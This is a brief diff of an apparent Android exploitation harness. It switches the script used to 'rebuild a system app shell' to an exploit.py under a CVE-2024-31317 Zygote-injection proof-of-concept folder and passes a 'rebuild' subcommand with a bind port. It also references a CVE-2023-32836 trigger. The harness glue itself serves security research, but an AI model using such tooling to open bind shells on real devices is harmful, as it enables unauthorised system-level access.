@@ -21,7 +21,7 @@ XRP_WRAPPER_JAVA = (
 )
 DRM_TRIGGER_JAVA = ROOT / "07-cve-2023-32836-display-overflow" / "poc" / "DrmTrigger.java"
 REBUILD_BIND_SHELL = (
-    ROOT / "06-cve-2024-31317-zygote-injection" / "poc" / "rebuild_bind_shell.py"
+    ROOT / "06-cve-2024-31317-zygote-injection" / "poc" / "exploit.py"
 )
 DEFAULT_REMOTE_DEX = "/data/data/com.android.settings/cache/apusys_ioctl_probe.dex"
 DEFAULT_XRP_REMOTE_DEX = "/data/data/com.android.settings/cache/xrp_wrapper_inspect.dex"
@@ -170,6 +170,7 @@ def require_system_app(port):
 def rebuild_system_app_shell(args):
     if not args.serial:
         raise RuntimeError("--rebuild-shell requires -s/--serial or ANDROID_SERIAL")
+    # exploit.py uses subcommand "rebuild" with -p for bind port
     cmd = [
         sys.executable,
         str(REBUILD_BIND_SHELL),
@@ -183,6 +184,7 @@ def rebuild_system_app_shell(args):
         args.rebuild_helper_ports,
         "--retries",
         str(args.rebuild_retries),
+        "rebuild",
     ]
     if args.skip_rebuild_clean:
         cmd.append("--skip-clean")
